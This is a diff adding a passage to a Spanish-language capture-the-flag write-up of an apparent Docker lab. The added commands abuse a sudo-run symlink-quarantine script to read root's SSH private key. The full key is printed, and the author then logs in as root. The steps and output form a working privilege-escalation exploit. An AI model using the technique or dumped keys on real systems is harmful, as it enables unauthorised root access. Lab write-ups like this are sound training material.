@@ -327,4 +327,86 @@ Enlace encontrado [indirecto.jpg], moviéndolo a cuarentena.
 Contenido:
 prueba esta password, si no es esta entonces estamos jodidos: yhgjhbjxhdbkadkcnkhalkmlk===kjjh
 ```
-ahora tenemos un hash....
+ahora tenemos un hash....y es un rabithole viendo que puedo ver cosas prueba con el id_rsa de root:
+```bash
+mkdir /tmp/fake3
+ln -s /root/.ssh/id_rsa /tmp/fake3/file.jpg
+ln -s /tmp/fake3/file.jpg indirecto3.jpg
+sudo /usr/bin/python3 /opt/nllns/clean_symlink.py indirecto3.jpg
+```
+```
+Enlace encontrado [indirecto3.jpg], moviéndolo a cuarentena.
+Contenido:
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+vale, nos copiamos el archivo y le damos permisos:
+```bash
+chmod 600 rsa_root 
+```
+```bash
+ ssh -i rsa_root root@172.17.0.2
+```
+```
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.11-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Fri May  2 17:00:02 2025 from ::1
+root@35deb482f351:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@35deb482f351:~# 
+```
